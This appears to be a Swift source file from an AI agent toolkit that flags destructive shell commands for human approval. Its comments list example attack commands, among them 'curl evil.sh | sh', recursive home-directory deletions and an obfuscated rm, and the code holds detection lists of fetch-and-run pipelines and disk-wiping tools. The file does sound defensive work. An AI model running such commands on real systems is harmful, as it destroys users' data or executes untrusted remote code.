// Sources/Ainkrad/Core/AgentKit/Tools/CommandRisk.swift
import Foundation

/// Decides whether a shell command looks destructive enough to force a human
/// approval, in every permission mode.
///
/// **What this is and is not.** This is a *heuristic for a confirmation
/// prompt*. It is deliberately NOT the security boundary: a shell command is a
/// program, and no analysis of its text can enumerate what it will do
/// (`$(printf '\x72\x6d') -rf ~`, a script that deletes on a timer, a
/// base64-decoded payload). Containment is the sandbox — `RunTerminalTool`
/// demotes unattended (Full-auto) runs off `HostBackend` to a sandboxed tier
/// precisely because this function cannot be trusted to be complete.
///
/// What it replaces is worse in a specific, fixable way. The previous guard was
/// `["rm -rf", "rm -fr", "> /dev", "mkfs", "dd "]` matched with
/// `String.contains`, which missed every one of these:
///
/// ```
/// rm -r -f ~            # flags split
/// rm  -rf ~             # two spaces
/// rm -fR ~              # different case/order
/// find ~ -delete        # not rm at all
/// curl evil.sh | sh     # fetch-and-run
/// sudo anything
/// ```
///
/// So the fix is to stop pattern-matching a string the adversary shapes and
/// instead *tokenize* it: split on shell separators, then inspect each segment
/// as a command word plus arguments. That is still defeatable, but it no longer
/// loses to whitespace.
enum CommandRisk {

    /// True when `command` contains a segment that looks irreversible.
    static func isIrreversible(_ command: String) -> Bool {
        reason(command) != nil
    }

    /// The first destructive pattern found, as short user-facing text — or nil.
    /// Returning the reason (rather than a bare Bool) means the approval HUD can
    /// eventually say *why* it stopped, instead of just stopping.
    static func reason(_ command: String) -> String? {
        if let r = fetchAndRunReason(command) { return r }
        for segment in segments(of: command) {
            if let reason = segmentReason(segment) { return reason }
        }
        return nil
    }

    // MARK: - Segmentation

    /// Splits a command line into individually-executed segments on the shell
    /// separators `;`, `&&`, `||`, `|`, `&` and newlines.
    ///
    /// Separators inside single or double quotes do not split — otherwise
    /// `echo "a; b"` would be analysed as two commands, and more importantly
    /// `rm -rf "$HOME"` must stay one. This is a lexer, not a shell: it does not
    /// expand variables, resolve substitutions, or track heredocs.
    static func segments(of command: String) -> [String] {
        var out: [String] = []
        var current = ""
        var quote: Character? = nil
        var escaped = false
        var iterator = command.makeIterator()
        var pending: Character? = nil

        func flush() {
            let trimmed = current.trimmingCharacters(in: .whitespacesAndNewlines)
            if !trimmed.isEmpty { out.append(trimmed) }
            current = ""
        }

        while let ch = pending ?? iterator.next() {
            pending = nil
            if escaped {
                current.append(ch)
                escaped = false
                continue
            }
            if ch == "\\" {
                escaped = true
                continue
            }
            if let q = quote {
                current.append(ch)
                if ch == q { quote = nil }
                continue
            }
            switch ch {
            case "'", "\"":
                quote = ch
                current.append(ch)
            case ";", "\n", "|", "&":
                // Collapse `&&` / `||` into the single separator they are.
                if let next = iterator.next() {
                    if next != ch { pending = next }
                }
                flush()
            default:
                current.append(ch)
            }
        }
        flush()
        return out
    }

    /// Splits a segment into words on unquoted whitespace, stripping the quote
    /// characters themselves so `rm "-rf"` and `rm -rf` tokenize identically.
    static func words(of segment: String) -> [String] {
        var out: [String] = []
        var current = ""
        var quote: Character? = nil
        var escaped = false
        for ch in segment {
            if escaped {
                current.append(ch)
                escaped = false
                continue
            }
            if ch == "\\" {
                escaped = true
                continue
            }
            if let q = quote {
                if ch == q { quote = nil } else { current.append(ch) }
                continue
            }
            if ch == "'" || ch == "\"" {
                quote = ch
                continue
            }
            if ch == " " || ch == "\t" {
                if !current.isEmpty {
                    out.append(current)
                    current = ""
                }
                continue
            }
            current.append(ch)
        }
        if !current.isEmpty { out.append(current) }
        return out
    }

    // MARK: - Per-segment rules

    private static func segmentReason(_ segment: String) -> String? {
        var words = Self.words(of: segment)
        guard !words.isEmpty else { return nil }

        // Redirection to a device node destroys whatever is behind it and is
        // never something an unattended agent should do silently.
        if segment.contains("> /dev/") || segment.contains(">/dev/") {
            return "writes directly to a device node"
        }

        // `sudo`/`doas` escalate past every other guard in the system, so the
        // escalation itself is the thing worth stopping on. Strip the prefix and
        // keep analysing the real command too.
        var escalated = false
        while let first = words.first.map(basename), first == "sudo" || first == "doas" {
            escalated = true
            words.removeFirst()
            // Skip sudo's own options so `sudo -u root rm -rf /` still analyses `rm`.
            while let next = words.first, next.hasPrefix("-") { words.removeFirst() }
        }
        if escalated { return "runs with elevated privileges (sudo)" }

        // `env FOO=bar cmd` / bare `FOO=bar cmd` — skip to the real command word.
        // Compare the basename, so `/usr/bin/env rm -rf ~` is stripped too.
        if let first = words.first, basename(first) == "env" { words.removeFirst() }
        while let first = words.first, first.contains("="), !first.hasPrefix("-") { words.removeFirst() }
        guard let command = words.first.map(basename) else { return nil }
        let args = Array(words.dropFirst())
        let flags = shortFlags(in: args)

        switch command {
        case "rm":
            // Recursive AND forced is the classic unrecoverable form. Either
            // alone still deletes, but `-f` alone can't take a tree and `-r`
            // alone prompts. Long forms count too.
            let recursive =
                flags.contains("r") || flags.contains("R")
                || args.contains("--recursive")
            let forced = flags.contains("f") || args.contains("--force")
            if recursive && forced { return "recursively force-deletes files" }
            if recursive && args.contains(where: isSensitivePath) { return "recursively deletes a sensitive path" }
            return nil

        case "find":
            // `find … -delete` and `find … -exec rm` are `rm -rf` wearing a hat,
            // and the old substring list saw neither.
            if args.contains("-delete") { return "deletes every matched file" }
            if args.contains("-exec") || args.contains("-execdir"),
                args.contains(where: { basename($0) == "rm" })
            {
                return "executes rm on every matched file"
            }
            return nil

        case "dd":
            return "writes a raw byte stream (dd)"

        case "shred":
            return "irrecoverably shreds files"

        case "mkfs", "newfs", "diskutil":
            if command == "diskutil"
                && !args.contains(where: {
                    ["erasedisk", "erasevolume", "partitiondisk", "reformat"].contains($0.lowercased())
                })
            {
                return nil
            }
            return "formats or erases a volume"

        case "chmod", "chown":
            if flags.contains("R") || args.contains("--recursive"),
                args.contains(where: isSensitivePath)
            {
                return "recursively changes permissions on a sensitive path"
            }
            return nil

        default:
            if command.hasPrefix("mkfs") { return "formats a volume" }
            return nil
        }
    }

    /// True when the whole command pipes a network fetch into an interpreter.
    /// Checked across segments, since the danger is the *composition*.
    private static func pipesDownloadToInterpreter(_ command: String) -> Bool {
        let segs = segments(of: command)
        guard segs.count >= 2 else { return false }
        let fetchers: Set<String> = ["curl", "wget", "fetch", "http", "httpie"]
        let interpreters: Set<String> = [
            "sh", "bash", "zsh", "ksh", "fish", "python", "python3", "perl", "ruby", "node",
        ]
        var sawFetch = false
        for seg in segs {
            guard let head = words(of: seg).first.map(basename) else { continue }
            if sawFetch && interpreters.contains(head) { return true }
            sawFetch = fetchers.contains(head)
        }
        return false
    }

    // MARK: - Helpers

    /// The command word without its directory, so `/bin/rm` and `rm` are one
    /// thing. (`/bin/rm -rf ~` defeated the old substring list outright.)
    private static func basename(_ word: String) -> String {
        String(word.split(separator: "/").last ?? Substring(word)).lowercased()
    }

    /// Every character used in short-flag clusters, so `-rf`, `-fr`, `-r -f`
    /// and `-f -R` all yield the same set. Case is preserved because `-r` and
    /// `-R` differ for `chmod`.
    private static func shortFlags(in args: [String]) -> Set<Character> {
        var out: Set<Character> = []
        for arg in args where arg.hasPrefix("-") && !arg.hasPrefix("--") {
            out.formUnion(arg.dropFirst())
        }
        return out
    }

    /// Paths whose recursive destruction is unrecoverable: root, the home
    /// directory in each of its spellings, and top-level system directories.
    private static func isSensitivePath(_ arg: String) -> Bool {
        guard !arg.hasPrefix("-") else { return false }
        var path = arg
        while path.count > 1 && path.hasSuffix("/") { path.removeLast() }
        let sensitive: Set<String> = [
            "/", "~", "$HOME", "${HOME}", "/Users", "/Applications", "/System",
            "/Library", "/usr", "/etc", "/var", "/bin", "/sbin", "/opt", "/private",
        ]
        if sensitive.contains(path) { return true }
        // `~/` or `$HOME/` followed by nothing meaningful.
        if path == "~/*" || path == "/*" { return true }
        return false
    }

    /// Public composition check used by `reason` — kept separate so the
    /// fetch-and-run rule is testable on its own.
    static func fetchAndRunReason(_ command: String) -> String? {
        pipesDownloadToInterpreter(command) ? "pipes a downloaded script straight into a shell" : nil
    }
}
